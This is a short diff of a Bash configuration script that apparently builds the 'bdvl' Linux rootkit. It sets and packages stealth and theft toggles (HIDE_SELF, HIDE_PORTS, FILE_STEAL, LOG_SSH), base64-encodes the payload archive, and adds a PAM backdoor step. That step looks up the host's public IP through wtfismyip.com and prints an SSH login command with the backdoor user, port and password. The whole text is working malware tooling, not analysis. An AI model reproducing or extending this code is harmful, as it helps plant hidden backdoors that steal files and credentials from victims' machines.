@@ -120,7 +120,7 @@ setup_configuration(){
     necho "Overwriting old variable placeholders"
     for selem in ${settings[@]}; do overwrite_placeholder "$selem" "${headers[*]}"; done
 
-    [ "`toggle_enabled HIDE_PORTS`" == "true" ] && write_hideports $NEW_MDIR/hideports
+    [ `toggle_enabled "HIDE_PORTS"` == 'true' ] && write_hideports $NEW_MDIR/hideports
 
     if [ $DOCOMPRESS == 1 ]; then
         [ ! -f `bin_path tar` ] && { eecho "Couldn't locate 'tar' on this machine."; exit; }
@@ -131,9 +131,8 @@ setup_configuration(){
         write_defaults $NEW_MDIR/settings
 
         verbose "Writing toggle settings"
-        local check_toggles=('ACCEPT_USE_SSL' 'USE_CRYPT' 'HIDE_SELF' 'HIDE_PORTS' \
-                             'FILE_STEAL' 'LOG_SSH') # these toggles are necessary for auto.sh to
-                                                     # check and react accordingly.
+        local check_toggles=(USE_CRYPT HIDE_SELF HIDE_PORTS FILE_STEAL LOG_SSH)
+
         for toggle in ${check_toggles[@]}; do toggle_setting $toggle >> $NEW_MDIR/toggles.conf; done
 
         local tarname="$NEW_MDIR.tar.gz"
@@ -145,5 +144,15 @@ setup_configuration(){
         local tarb64="$NEW_MDIR.b64"
         necho "Writing $tarname into $tarb64"
         cat $tarname | base64 > $tarb64
+
+        secho "Done."
+
+        if [ `toggle_enabled "USE_PAM_BD"` == 'true' ]; then
+            local addr_src='http://wtfismyip.com/text'
+            [ -f `bin_path curl` ] && local addr_q="curl -s $addr_src"
+            [ -f `bin_path wget` ] && local addr_q="wget -q -O - $addr_src"
+            echo -e "\n\tAfter bdvl is installed:"
+            echo -e "\t\e[32mbash etc/ssh.sh $BD_UNAME `$addr_q` $PAM_PORT # $BD_PWD\e[0m\n"
+        fi
     fi
 }
